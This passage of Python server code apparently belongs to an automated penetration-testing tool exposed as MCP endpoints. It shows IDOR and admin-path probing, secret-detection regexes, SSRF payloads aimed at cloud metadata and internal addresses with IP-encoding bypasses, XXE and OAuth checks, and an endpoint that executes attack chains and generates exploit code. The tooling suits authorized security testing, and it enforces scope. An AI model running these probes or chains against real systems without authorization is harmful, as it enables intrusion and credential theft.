        profile.setdefault("web", {})["auth"] = {
            "type": auth_cfg.type,
            "header_names": header_names,
            "has_bearer": has_bearer,
            "has_api_key_style": has_api_key_style,
        }

    # --- JS miner (creds.json) ingestion with classification + redaction ---
    def _classify_js_secret(snippet: str) -> tuple[str, str, str]:
        """Return (kind, confidence, redacted_snippet) for a JS secret candidate."""
        s = snippet or ""

        # JWT-like: header.payload.signature
        parts = s.split(".")
        if len(parts) == 3 and all(parts):
            red = f"{parts[0]}.[redacted].[redacted]"
            return "jwt", "high", red

        lower = s.lower()

        # API key style
        if any(k in lower for k in ["api_key", "apikey", "x-api-key"]):
            # show only prefix + masked tail
            prefix = s[:6]
            suffix = s[-4:] if len(s) > 10 else ""
            red = f"{prefix}****{suffix}" if suffix else f"{prefix}****"
            return "api_key", "high", red

        # Bearer token
        if lower.startswith("bearer "):
            token = s.split(" ", 1)[1] if " " in s else ""
            if token:
                prefix = token[:4]
                suffix = token[-4:] if len(token) > 10 else ""
                red_token = f"{prefix}****{suffix}" if suffix else f"{prefix}****"
                return "bearer_token", "high", f"Bearer {red_token}"

        # Basic credential user:pass
        if ":" in s and s.count(":") == 1:
            user, pwd = s.split(":", 1)
            if user and pwd and len(pwd) >= 4:
                return "basic_credential", "medium", f"{user}:****"

        # Fallback: generic secret with partial redaction
        if len(s) > 12:
            prefix = s[:4]
            suffix = s[-4:]
            red = f"{prefix}****{suffix}"
        else:
            red = s[:4] + "****"
        # Rough confidence heuristic: longer/more complex strings treated as medium
        has_digit = any(c.isdigit() for c in s)
        has_upper = any(c.isupper() for c in s)
        has_lower = any(c.islower() for c in s)
        complexity = sum([has_digit, has_upper, has_lower])
        conf = "medium" if len(s) > 16 and complexity >= 2 else "low"
        return "generic_secret", conf, red

    js_dir = os.path.join(ARTIFACTS_DIR, "js_miner", host)
    js_creds: list[Dict[str, Any]] = []
    if os.path.isdir(js_dir):
        for root, _dirs, files in os.walk(js_dir):
            for fname in files:
                if fname != "creds.json":
                    continue
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, "r", encoding="utf-8") as fh:
                        data = json.load(fh)
                except Exception:
                    continue
                if isinstance(data, list):
                    for entry in data:
                        if not isinstance(entry, dict):
                            continue
                        context = entry.get("context")
                        raw_snippet = entry.get("snippet") or ""
                        kind, confidence, redacted = _classify_js_secret(str(raw_snippet))
                        js_creds.append({
                            "context": context,
                            "snippet": redacted,
                            "kind": kind,
                            "confidence": confidence,
                        })

    if js_creds:
        by_kind: Dict[str, int] = {}
        for e in js_creds:
            k = e.get("kind") or "unknown"
            by_kind[k] = by_kind.get(k, 0) + 1

        profile.setdefault("web", {})["js_secrets"] = {
            "count": len(js_creds),
            "by_kind": by_kind,
            "samples": js_creds[:20],
        }

    # --- Security Headers Analysis ---
    # Auto-trigger security headers check if we have URLs
    if all_urls:
        target_url = all_urls[0]  # Check the first discovered URL
        try:
            print(f"[HOST_PROFILE] Auto-checking security headers for {target_url}", file=sys.stderr)
            headers_result = _run_security_headers_internal(target_url)
            if headers_result:
                profile.setdefault("web", {})["security_headers"] = {
                    "url": headers_result.get("url"),
                    "score": headers_result.get("score", 0),
                    "issues": [
                        {
                            "header": issue.get("header"),
                            "severity": issue.get("severity"),
                            "issue": issue.get("issue"),
                        }
                        for issue in headers_result.get("issues", [])
                    ],
                }
        except Exception as e:
            print(f"[HOST_PROFILE] Security headers check failed: {e}", file=sys.stderr)

    # Save snapshot
    _save_host_profile_snapshot(host, profile)
    return profile

@app.post("/mcp/host_delta")
def host_delta(req: CloudReconRequest):
    """
    Compute delta between current and previous host_profile snapshots.
    """
    host = _enforce_scope(req.host)

    current = _load_host_profile_snapshot(host, latest=True)
    previous = _load_host_profile_snapshot(host, latest=False)

    if not current or not previous:
        raise HTTPException(
            status_code=404,
            detail="Not enough history for host delta (need at least 2 snapshots).",
        )

    delta: Dict[str, Any] = {
        "host": host,
        "current_ts": current.get("created"),
        "previous_ts": previous.get("created"),
    }

    curr_web = current.get("web", {}) or {}
    prev_web = previous.get("web", {}) or {}

    curr_urls = set(curr_web.get("urls", []) or [])
    prev_urls = set(prev_web.get("urls", []) or [])

    urls_added = sorted(curr_urls - prev_urls)
    urls_removed = sorted(prev_urls - curr_urls)

    def _api_key(e: Dict[str, Any]) -> tuple:
        return (e.get("url"), (e.get("method") or "GET").upper())

    curr_api_raw = curr_web.get("api_endpoints", []) or []
    prev_api_raw = prev_web.get("api_endpoints", []) or []

    curr_api_set = {_api_key(e) for e in curr_api_raw if e.get("url")}
    prev_api_set = {_api_key(e) for e in prev_api_raw if e.get("url")}

    api_added = sorted(curr_api_set - prev_api_set)
    api_removed = sorted(prev_api_set - curr_api_set)

    delta["web"] = {
        "urls_added": urls_added,
        "urls_removed": urls_removed,
        "api_endpoints_added": [
            {"url": u, "method": m} for (u, m) in api_added
        ],
        "api_endpoints_removed": [
            {"url": u, "method": m} for (u, m) in api_removed
        ],
    }

    return delta

# ---------- startup ----------

@app.post("/mcp/run_api_recon", response_model=ApiReconResult)
def run_api_recon(req: ApiReconRequest):
    """
    Basic API recon over host_profile.web.api_endpoints:
    - GET + OPTIONS on each endpoint
    - Capture status codes, Allow header, and basic auth behavior.
    """
    host = _enforce_scope(req.host)

    # 1) Require existing snapshot
    profile = _load_host_profile_snapshot(host, latest=True)
    if not profile:
        raise HTTPException(status_code=404, detail="No host_profile snapshot found for host")

    web = profile.get("web", {}) or {}
    api_endpoints = web.get("api_endpoints", []) or []

    # 2) Require at least one API endpoint
    if not api_endpoints:
        raise HTTPException(status_code=404, detail="No api_endpoints in host_profile for host")

    probes: List[Dict[str, Any]] = []

    for ep in api_endpoints:
        url = ep.get("url")
        method = (ep.get("method") or "GET").upper()
        if not url:
            continue

        probe: Dict[str, Any] = {
            "url": url,
            "method": method,
            "status_get": None,
            "status_options": None,
            "allow_header": None,
            "requires_auth": None,
            "notes": None,
        }

        # GET
        try:
            rate_limit_wait()
            resp_get = requests.get(url, timeout=15)
            probe["status_get"] = resp_get.status_code
            if resp_get.status_code in (401, 403):
                probe["requires_auth"] = True
        except Exception as e:
            probe["notes"] = f"GET error: {e}"

        # OPTIONS
        try:
            rate_limit_wait()
            resp_opt = requests.options(url, timeout=15)
            probe["status_options"] = resp_opt.status_code
            allow = resp_opt.headers.get("Allow")
            if allow:
                probe["allow_header"] = allow
        except Exception as e:
            prev_notes = probe.get("notes") or ""
            suffix = f"; OPTIONS error: {e}" if prev_notes else f"OPTIONS error: {e}"
            probe["notes"] = (prev_notes + suffix).strip("; ")

        probes.append(probe)

    ts = int(time.time())
    out_name = f"api_recon_{host.replace(':', '_')}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(probes, fh, indent=2)

    return ApiReconResult(
        host=host,
        endpoints_count=len(probes),
        findings_file=out_path,
    )


# ---------- BAC / SSRF / Nuclei Validation Endpoints ----------

def _get_auth_token(base_url: str, req: BacChecksRequest) -> Optional[str]:
    """Helper to obtain an auth token for BAC testing."""
    # Try quick login first
    if req.quick_login_url:
        try:
            login_url = base_url.rstrip("/") + req.quick_login_url
            resp = requests.get(login_url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                return data.get("token") or resp.headers.get("X-Auth-Token")
        except Exception:
            pass
    
    # Try credential-based login
    if req.login_url and req.credentials:
        try:
            login_url = base_url.rstrip("/") + req.login_url
            resp = requests.post(login_url, json=req.credentials, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                return data.get("token") or resp.headers.get("X-Auth-Token")
        except Exception:
            pass
    
    # Use pre-configured auth header
    if req.auth_header:
        return req.auth_header
    
    return None


def _scan_response_for_sensitive_data(content: str, url: str) -> List[Dict[str, Any]]:
    """Scan response content for sensitive data patterns."""
    import re
    findings = []
    
    # Sensitive data patterns
    patterns = [
        (r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{16,})["\']?', "api_key"),
        (r'["\']?secret["\']?\s*[:=]\s*["\']?([^"\']{8,})["\']?', "secret"),
        (r'["\']?password["\']?\s*[:=]\s*["\']?([^"\']{4,})["\']?', "password"),
        (r'["\']?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-\.]{20,})["\']?', "token"),
        (r'["\']?private[_-]?key["\']?\s*[:=]', "private_key"),
        (r'["\']?aws[_-]?(access|secret)["\']?\s*[:=]', "aws_credential"),
        (r'Bearer\s+[a-zA-Z0-9_\-\.]+', "bearer_token"),
    ]
    
    for pattern, data_type in patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        if matches:
            findings.append({
                "type": "sensitive_data_exposure",
                "data_type": data_type,
                "url": url,
                "match_count": len(matches) if isinstance(matches[0], str) else len(matches),
            })
    
    return findings


@app.post("/mcp/run_bac_checks", response_model=BacChecksResult)
def run_bac_checks(req: BacChecksRequest):
    """
    Run Broken Access Control (BAC) / IDOR checks against a host.
    
    This endpoint:
    1. Loads the host_profile to find API endpoints
    2. Tests for horizontal privilege escalation (IDOR - accessing other users' data)
    3. Tests for vertical privilege escalation (user accessing admin functions)
    4. Scans responses for sensitive data exposure
    5. Returns a summary of findings
    
    Supports authenticated testing via quick_login_url, login_url+credentials, or auth_header.
    """
    host = _enforce_scope(req.host)
    base_url = f"http://{host}" if "://" not in host else host
    
    # Load host profile to get API endpoints
    profile = _load_host_profile_snapshot(host, latest=True)
    
    checks_run = 0
    confirmed_issues: List[Dict[str, Any]] = []
    
    # Get auth token for authenticated testing
    auth_token = _get_auth_token(base_url, req)
    auth_headers = {"Authorization": f"Bearer {auth_token}"} if auth_token else {}
    
    # Get API endpoints from profile
    web = (profile.get("web", {}) or {}) if profile else {}
    api_endpoints = web.get("api_endpoints", []) or []
    
    # Also check authenticated endpoints if available
    auth_katana = web.get("auth_katana", {}) or {}
    auth_endpoints = auth_katana.get("api_endpoints", []) or []
    
    all_endpoints = api_endpoints + auth_endpoints
    
    # Common IDOR patterns to test
    idor_patterns = [
        # User ID patterns
        (r"/users?/(\d+)", "user_id"),
        (r"/account/(\d+)", "account_id"),
        (r"/profile/(\d+)", "profile_id"),
        (r"/api/v\d+/users?/(\d+)", "api_user_id"),
        # Object ID patterns
        (r"/orders?/(\d+)", "order_id"),
        (r"/documents?/(\d+)", "document_id"),
        (r"/files?/(\d+)", "file_id"),
        (r"/messages?/(\d+)", "message_id"),
        # UUID patterns
        (r"/([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})", "uuid"),
    ]
    
    import re
    
    # Test IDOR with authentication if available
    for ep in all_endpoints:
        url = ep.get("url", "")
        if not url:
            continue
        
        # Check for IDOR-vulnerable URL patterns
        for pattern, id_type in idor_patterns:
            match = re.search(pattern, url, re.IGNORECASE)
            if match:
                original_id = match.group(1)
                checks_run += 1
                
                # Try incrementing numeric IDs
                if original_id.isdigit():
                    test_id = str(int(original_id) + 1)
                    test_url = url[:match.start(1)] + test_id + url[match.end(1):]
                    
                    try:
                        rate_limit_wait()
                        resp = requests.get(test_url, headers=auth_headers, timeout=10)
                        
                        # Check if we got a successful response (potential IDOR)
                        if resp.status_code == 200:
                            confirmed_issues.append({
                                "type": "potential_idor",
                                "id_type": id_type,
                                "original_url": url,
                                "test_url": test_url,
                                "status_code": resp.status_code,
                                "confidence": "high" if auth_token else "medium",
                                "authenticated": bool(auth_token),
                                "note": f"Accessed {id_type}={test_id} - potential horizontal privilege escalation",
                            })
                            # Check for sensitive data in response
                            sensitive = _scan_response_for_sensitive_data(resp.text, test_url)
                            confirmed_issues.extend(sensitive)
                    except Exception:
                        pass
                break  # Only test first matching pattern per URL
    
    # Check for admin endpoints accessible without auth
    admin_paths = ["/admin", "/admin/users", "/admin/config", "/dashboard", "/manage", "/config", "/settings", "/api/internal/debug"]
    
    for admin_path in admin_paths:
        test_url = base_url.rstrip("/") + admin_path
        
        # Test 1: Without authentication
        checks_run += 1
        try:
            rate_limit_wait()
            resp = requests.get(test_url, timeout=10)
            
            if resp.status_code == 200:
                content = resp.text.lower()
                if any(kw in content for kw in ["admin", "dashboard", "management", "settings", "config", "debug", "users"]):
                    confirmed_issues.append({
                        "type": "exposed_admin",
                        "url": test_url,
                        "status_code": resp.status_code,
                        "confidence": "high",
                        "note": "Admin endpoint accessible without authentication",
                    })
                    # Check for sensitive data
                    sensitive = _scan_response_for_sensitive_data(resp.text, test_url)
                    confirmed_issues.extend(sensitive)
        except Exception:
            pass
        
        # Test 2: With regular user authentication (vertical privilege escalation)
        if auth_token:
            checks_run += 1
            try:
                rate_limit_wait()
                resp = requests.get(test_url, headers=auth_headers, timeout=10)
                
                if resp.status_code == 200:
                    content = resp.text.lower()
                    # Check if this is an admin-only endpoint that user shouldn't access
                    if any(kw in content for kw in ["admin", "all users", "system config", "debug"]):
                        confirmed_issues.append({
                            "type": "vertical_privilege_escalation",
                            "url": test_url,
                            "status_code": resp.status_code,
                            "confidence": "high",
                            "authenticated": True,
                            "note": "Regular user can access admin endpoint - vertical privilege escalation",
                        })
                        # Check for sensitive data
                        sensitive = _scan_response_for_sensitive_data(resp.text, test_url)
                        confirmed_issues.extend(sensitive)
            except Exception:
                pass
    
    # Additional IDOR tests with authentication on common patterns
    if auth_token:
        idor_test_paths = [
            ("/api/users/1", "/api/users/2", "user"),
            ("/api/users/2", "/api/users/3", "user"),
            ("/api/orders/1", "/api/orders/2", "order"),
            ("/api/orders/2", "/api/orders/3", "order"),
            ("/api/profile/1", "/api/profile/2", "profile"),
        ]
        
        for own_path, other_path, resource_type in idor_test_paths:
            test_url = base_url.rstrip("/") + other_path
            checks_run += 1
            
            try:
                rate_limit_wait()
                resp = requests.get(test_url, headers=auth_headers, timeout=10)
                
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        # If we got actual data, it's likely an IDOR
                        if data and (isinstance(data, dict) and data.get("id")) or isinstance(data, list):
                            confirmed_issues.append({
                                "type": "idor_authenticated",
                                "resource_type": resource_type,
                                "url": test_url,
                                "status_code": resp.status_code,
                                "confidence": "high",
                                "note": f"Authenticated user can access other user's {resource_type} data",
                            })
                            # Check for sensitive data like API keys
                            sensitive = _scan_response_for_sensitive_data(resp.text, test_url)
                            confirmed_issues.extend(sensitive)
                    except:
                        pass
            except Exception:
                pass
    
    # Build summary
    summary_parts = []
    if confirmed_issues:
        summary_parts.append(f"Found {len(confirmed_issues)} potential BAC issue(s)")
        by_type = {}
        for issue in confirmed_issues:
            t = issue.get("type", "unknown")
            by_type[t] = by_type.get(t, 0) + 1
        summary_parts.append(f"Types: {by_type}")
    else:
        summary_parts.append("No BAC issues detected")
    
    summary = "; ".join(summary_parts)
    
    # Save results
    ts = int(time.time())
    out_name = f"bac_checks_{host.replace(':', '_')}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)
    
    results = {
        "host": host,
        "authenticated": bool(auth_token),
        "checks_run": checks_run,
        "confirmed_issues": confirmed_issues,
        "summary": summary,
    }
    
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(results, fh, indent=2)
    
    return BacChecksResult(
        host=host,
        meta={
            "checks_count": checks_run,
            "authenticated": bool(auth_token),
            "confirmed_issues_count": len(confirmed_issues),
            "summary": summary,
            "findings_file": out_path,
            "issues": confirmed_issues[:10],  # Return first 10 for quick review
        },
    )


@app.post("/mcp/run_ssrf_checks", response_model=SsrfChecksResult)
def run_ssrf_checks(req: SsrfChecksRequest):
    """
    Run Server-Side Request Forgery (SSRF) checks against a target URL.
    
    This endpoint tests for SSRF vulnerabilities by:
    1. Injecting internal IP addresses (127.0.0.1, localhost, etc.)
    2. Testing cloud metadata endpoints (169.254.169.254)
    3. Testing DNS rebinding indicators
    4. Checking for response differences that indicate SSRF
    5. Using callback-based validation for out-of-band detection
    
    Note: For full SSRF detection, callback-based validation is recommended.
    Set CALLBACK_SERVER_URL environment variable to enable.
    """
    # Extract host from target URL for scope check
    from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
    
    parsed = urlparse(req.target)
    host = parsed.netloc  # Keep port for scope check
    _enforce_scope(host)
    
    # Initialize callback correlator if callback server is configured
    callback_enabled = req.use_callback and os.environ.get("CALLBACK_SERVER_URL")
    correlator = None
    job_id = None
    callback_token = None
    callback_url = None
    
    if callback_enabled:
        try:
            from tools.callback_correlator import CallbackCorrelator
            callback_server_url = os.environ.get("CALLBACK_SERVER_URL")
            correlator = CallbackCorrelator(callback_server_url)
            job_id = f"ssrf_{normalize_target(req.target)}_{int(time.time())}"
            callback_token = correlator.register_job(job_id, "ssrf", req.target, timeout=300)
            callback_url = correlator.get_callback_url(callback_token)
            print(f"[SSRF] Callback enabled: {callback_url}")
        except Exception as e:
            print(f"[SSRF] Callback setup failed: {e}, continuing without callbacks")
            callback_enabled = False
    
    checks_run = 0
    confirmed_issues: List[Dict[str, Any]] = []
    targets_reached: List[str] = []
    
    # SSRF test payloads
    ssrf_payloads = [
        # Localhost variants
        ("http://127.0.0.1/", "localhost_ip"),
        ("http://localhost/", "localhost_name"),
        ("http://0.0.0.0/", "zero_ip"),
        ("http://[::1]/", "ipv6_localhost"),
        # Cloud metadata endpoints
        ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
        ("http://metadata.google.internal/", "gcp_metadata"),
        ("http://169.254.169.254/metadata/instance", "azure_metadata"),
        # Internal network ranges
        ("http://10.0.0.1/", "internal_10"),
        ("http://192.168.1.1/", "internal_192"),
        ("http://172.16.0.1/", "internal_172"),
        # Bypass techniques
        ("http://127.0.0.1.nip.io/", "dns_rebind"),
        ("http://0x7f000001/", "hex_ip"),
        ("http://2130706433/", "decimal_ip"),
    ]
    
    # If callback enabled, add callback URL to metadata endpoint payloads
    if callback_enabled and callback_url:
        enhanced_payloads = []
        for payload, payload_type in ssrf_payloads:
            if "metadata" in payload_type:
                # Append callback parameter to metadata endpoints
                separator = "&" if "?" in payload else "?"
                enhanced_payload = f"{payload}{separator}callback={callback_url}"
                enhanced_payloads.append((enhanced_payload, payload_type))
            else:
                enhanced_payloads.append((payload, payload_type))
        ssrf_payloads = enhanced_payloads
    
    param = req.param or "url"
    
    # Parse the original URL to find where to inject
    query_params = parse_qs(parsed.query, keep_blank_values=True)
    
    for payload, payload_type in ssrf_payloads:
        checks_run += 1
        
        # Inject payload into the specified parameter
        test_params = query_params.copy()
        test_params[param] = [payload]
        
        new_query = urlencode(test_params, doseq=True)
        test_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment,
        ))
        
        try:
            rate_limit_wait()
            resp = requests.get(test_url, timeout=10, allow_redirects=False)
            
            # Analyze response for SSRF indicators
            content = resp.text.lower()
            
            # Check for signs of successful SSRF
            ssrf_indicators = [
                # AWS metadata
                "ami-id", "instance-id", "instance-type", "iam",
                # Error messages revealing internal access
                "connection refused", "no route to host",
                # Internal service responses
                "nginx", "apache", "localhost", "internal",
            ]
            
            indicator_found = any(ind in content for ind in ssrf_indicators)
            
            # Different response size/time might indicate SSRF
            if resp.status_code == 200 and indicator_found:
                confirmed_issues.append({
                    "type": "ssrf_" + payload_type,
                    "payload": payload,
                    "test_url": test_url,
                    "status_code": resp.status_code,
                    "confidence": "high" if "metadata" in payload_type else "medium",
                    "response_snippet": content[:200],
                })
                targets_reached.append(payload_type)
            elif resp.status_code in (200, 301, 302) and payload_type.startswith("internal"):
                # Got a response from internal IP - potential SSRF
                confirmed_issues.append({
                    "type": "ssrf_" + payload_type,
                    "payload": payload,
                    "test_url": test_url,
                    "status_code": resp.status_code,
                    "confidence": "low",
                    "note": "Response received from internal IP range",
                })
                targets_reached.append(payload_type)
                
        except requests.exceptions.Timeout:
            # Timeout might indicate the server tried to reach an unreachable internal host
            pass
        except requests.exceptions.ConnectionError:
            # Connection error is expected for most payloads
            pass
        except Exception as e:
            # Other errors - skip
            pass
    
    # Poll for callback hits if callback enabled
    if callback_enabled and correlator:
        print(f"[SSRF] Polling for callback hits (job_id: {job_id})...")
        time.sleep(5)  # Wait for potential callback
        hits = correlator.poll_hits(job_id, timeout=60, interval=2)
        if hits:
            print(f"[SSRF] Received {len(hits)} callback hit(s)")
            # Add callback evidence to confirmed_issues
            for hit in hits:
                confirmed_issues.append({
                    "type": "ssrf_callback_confirmed",
                    "confidence": "high",
                    "callback_evidence": {
                        "remote_addr": hit.get("remote_addr"),
                        "user_agent": hit.get("user_agent"),
                        "method": hit.get("method"),
                        "path": hit.get("path"),
                        "query_params": hit.get("query_params"),
                        "timestamp": hit.get("timestamp"),
                    },
                    "note": "SSRF confirmed via out-of-band callback"
                })
                targets_reached.append("callback_oob")
    
    # Build summary
    if confirmed_issues:
        summary = f"Found {len(confirmed_issues)} potential SSRF issue(s). Targets reached: {', '.join(set(targets_reached))}"
    else:
        summary = f"No SSRF issues detected after {checks_run} checks"
    
    # Save results
    ts = int(time.time())
    host_key = host.replace(":", "_").replace("/", "_")
    out_name = f"ssrf_checks_{host_key}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)
    
    results = {
        "target": req.target,
        "param": param,
        "checks_run": checks_run,
        "confirmed_issues": confirmed_issues,
        "targets_reached": targets_reached,
        "summary": summary,
    }
    
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(results, fh, indent=2)
    
    return SsrfChecksResult(
        target=req.target,
        param=param,
        meta={
            "checks_count": checks_run,
            "confirmed_issues_count": len(confirmed_issues),
            "summary": summary,
            "targets_reached": targets_reached,
            "findings_file": out_path,
            "issues": confirmed_issues[:10],
        },
    )


@app.post("/mcp/run_xxe_checks", response_model=XxeChecksResult)
def run_xxe_checks(req: XxeChecksRequest):
    """
    Run XXE (XML External Entity) validation checks.
    
    This endpoint tests for XXE vulnerabilities by:
    1. Testing external entity injection with OOB callbacks
    2. Testing local file inclusion
    3. Testing SSRF via XXE
    4. Using callback-based validation for out-of-band detection
    
    Note: For full XXE detection, callback-based validation is recommended.
    Set CALLBACK_SERVER_URL environment variable to enable.
    """
    from tools.xxe_validator import validate_xxe
    
    parsed = urlparse(req.target)
    host = parsed.netloc
    _enforce_scope(host)
    
    # Get callback server URL if enabled
    callback_url = None
    if req.use_callback:
        callback_url = os.environ.get("CALLBACK_SERVER_URL")
    
    discovery_data = {"target": req.target}
    results = validate_xxe(discovery_data, callback_url)
    
    # Save results
    ts = int(time.time())
    host_key = host.replace(":", "_").replace("/", "_")
    out_name = f"xxe_checks_{host_key}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)
    
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2)
    
    return XxeChecksResult(
        target=req.target,
        meta={
            "findings_count": len(results.get("findings", [])),
            "tests_run": results.get("tests_run", 0),
            "vulnerable": results.get("vulnerable", False),
            "findings_file": out_path
        },
        results=results
    )


@app.post("/mcp/run_business_logic_checks", response_model=BusinessLogicChecksResult)
def run_business_logic_checks(req: BusinessLogicChecksRequest):
    """
    Run business logic vulnerability checks.
    
    This endpoint tests for business logic flaws by:
    1. Analyzing application workflows from discovery data
    2. Testing pricing/quantity manipulation
    3. Testing workflow bypasses (skipping steps)
    4. Testing rate limit bypasses
    5. Testing state transition vulnerabilities
    
    Note: Requires discovery data (endpoints, URLs) from recon phase.
    Use /mcp/host_profile to get discovery data for a host.
    """
    from tools.business_logic_analyzer import validate_business_logic
    from tools.workflow_validator import validate_state_transitions
    
    parsed = urlparse(req.target)
    host = parsed.netloc if parsed.netloc else req.target
    _enforce_scope(host)
    
    # Get discovery data from host profile
    discovery_data = {"target": req.target}
    
    # Try to load host profile for discovery data
    host_key = host.replace(":", "_").replace("/", "_")
    host_profile_file = os.path.join(HOST_HISTORY_DIR, f"host_profile_{host_key}.json")
    if os.path.exists(host_profile_file):
        try:
            with open(host_profile_file, "r", encoding="utf-8") as f:
                profile = json.load(f)
                # Merge profile data into discovery_data
                if "web" in profile:
                    discovery_data["web"] = profile.get("web", {})
                if "api_endpoints" in profile:
                    discovery_data["api_endpoints"] = profile["api_endpoints"]
        except Exception as e:
            print(f"[BUSINESS-LOGIC] Failed to load host profile: {e}")
    
    # Run business logic validation
    results = validate_business_logic(discovery_data, req.auth_context)
    
    # Also run workflow state transition validation
    if results.get("workflow"):
        state_result = validate_state_transitions(results["workflow"], req.auth_context)
        results["tests_run"] += 1
        if state_result["vulnerable"]:
            results["vulnerable"] = True
            results["findings"].append(state_result)
    
    # Save results
    ts = int(time.time())
    out_name = f"business_logic_{host_key}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)
    
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2)
    
    return BusinessLogicChecksResult(
        target=req.target,
        meta={
            "findings_count": len(results.get("findings", [])),
            "tests_run": results.get("tests_run", 0),
            "vulnerable": results.get("vulnerable", False),
            "workflow_patterns": len(results.get("workflow", {}).get("workflow_patterns", [])),
            "findings_file": out_path
        },
        results=results
    )


@app.post("/mcp/exploit_chain", response_model=ExploitChainResult)
def exploit_chain(req: ExploitChainRequest):
    """
    Execute an attack chain automatically.
    
    This endpoint:
    1. Finds exploitable chains from findings
    2. Executes the highest priority chain
    3. Generates exploit code for the chain
    4. Returns execution results and impact assessment
    
    Note: Only executes chains with high exploitability scores.
    """
    from tools.finding_correlation import find_chains
    from tools.chain_exploiter import execute_chain
    from tools.exploit_generator import generate_chain_exploit
    
    # Find chains from findings
    chains = find_chains(req.findings)
    
    if not chains:
        return ExploitChainResult(
            success=False,
            chain_name=None,
            steps_executed=0,
            final_impact=None,
            exploit_code=None,
            evidence=[],
        )
    
    # Select best chain (highest exploitability score)
    best_chain = chains[0]
    chain_findings = best_chain.get("steps", [])
    
    # Execute chain
    execution_result = execute_chain(chain_findings, req.auth_context)
    
    # Generate exploit code
    exploit_code = None
    if execution_result.get("success"):
        exploit_code = generate_chain_exploit(chain_findings, format="markdown")
    
    return ExploitChainResult(
        success=execution_result.get("success", False),
        chain_name=best_chain.get("name"),
        steps_executed=execution_result.get("steps_executed", 0),
        final_impact=execution_result.get("final_impact"),
        exploit_code=exploit_code,
        evidence=execution_result.get("evidence", []),
    )


@app.post("/mcp/run_cloud_checks", response_model=CloudChecksResult)
def run_cloud_checks(req: CloudChecksRequest):
    """
    Run cloud-specific vulnerability checks.
    
    This endpoint tests for:
    1. Cloud metadata endpoint access (AWS, GCP, Azure)
    2. Storage bucket misconfigurations (S3, GCS, Azure Blob)
    3. IAM misconfigurations and credential exposure
    
    Note: Requires SSRF vulnerability or direct metadata access.
    """
    from tools.cloud_metadata_tester import test_cloud_metadata
    from tools.cloud_storage_tester import test_cloud_storage
    from tools.cloud_iam_analyzer import analyze_cloud_iam
    
    parsed = urlparse(req.target)
    host = parsed.netloc if parsed.netloc else req.target
    _enforce_scope(host)
    
    results = {
        "metadata_tests": {},
        "storage_tests": {},
        "iam_analysis": {},
        "vulnerable": False
    }
    
    # Test metadata endpoints
    callback_url = os.environ.get("CALLBACK_SERVER_URL")
    metadata_results = test_cloud_metadata(req.target, callback_url)
    results["metadata_tests"] = metadata_results
    if metadata_results.get("vulnerable"):
        results["vulnerable"] = True
    
    # If metadata response provided, analyze it
    if req.metadata_response:
        # Test storage buckets
        discovery_data = {"metadata_response": req.metadata_response}
        storage_results = test_cloud_storage(discovery_data)
        results["storage_tests"] = storage_results
        if storage_results.get("vulnerable"):
            results["vulnerable"] = True
        
        # Analyze IAM
        iam_results = analyze_cloud_iam(req.metadata_response)
        results["iam_analysis"] = iam_results
        if iam_results.get("vulnerable"):
            results["vulnerable"] = True
    
    # Save results
    ts = int(time.time())
    host_key = host.replace(":", "_").replace("/", "_")
    out_name = f"cloud_checks_{host_key}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)
    
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2)
    
    return CloudChecksResult(
        target=req.target,
        meta={
            "vulnerable": results["vulnerable"],
            "metadata_tests_run": metadata_results.get("tests_run", 0),
            "findings_file": out_path
        },
        results=results
    )


@app.post("/mcp/run_oauth_checks", response_model=OAuthChecksResult)
def run_oauth_checks(req: OAuthChecksRequest):
    """
    Run OAuth/OIDC security checks against a target host.
    
    This endpoint:
    1. Discovers OAuth/OIDC endpoints
    2. Validates for common misconfigurations:
       - Open redirect via redirect_uri manipulation
       - State parameter fixation/missing checks
       - Token leakage via referrer header
       - Scope escalation attempts
       - PKCE downgrade attacks
    """
    host = _enforce_scope(req.host)
    base_url = f"http://{host}" if "://" not in host else host
    
    # Run discovery
    discovery_script = os.path.join(os.path.dirname(__file__), "tools", "oauth_discovery.py")
    if not os.path.exists(discovery_script):
        raise HTTPException(
            status_code=500,
            detail=f"oauth_discovery.py not found at {discovery_script}",
        )
    
    # Create temp files (initialize before try block for proper cleanup)
    import tempfile
    discovery_file = None
    validation_file = None
    
    try:
        # Create temp file for discovery output
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            discovery_file = f.name
        
        # Run discovery
        cmd = [
            sys.executable,
            discovery_script,
            "--target",
            base_url,
            "--output",
            discovery_file,
        ]
        
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if proc.returncode != 0:
            raise HTTPException(
                status_code=500,
                detail=f"OAuth discovery failed: {proc.stderr}",
            )
        
        # Load discovery results
        with open(discovery_file, "r", encoding="utf-8") as fh:
            discovery_data = json.load(fh)
        
        # Run validation
        validator_script = os.path.join(os.path.dirname(__file__), "tools", "oauth_validator.py")
        if not os.path.exists(validator_script):
            raise HTTPException(
                status_code=500,
                detail=f"oauth_validator.py not found at {validator_script}",
            )
        
        # Create temp file for validation output
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            validation_file = f.name
        
        cmd = [
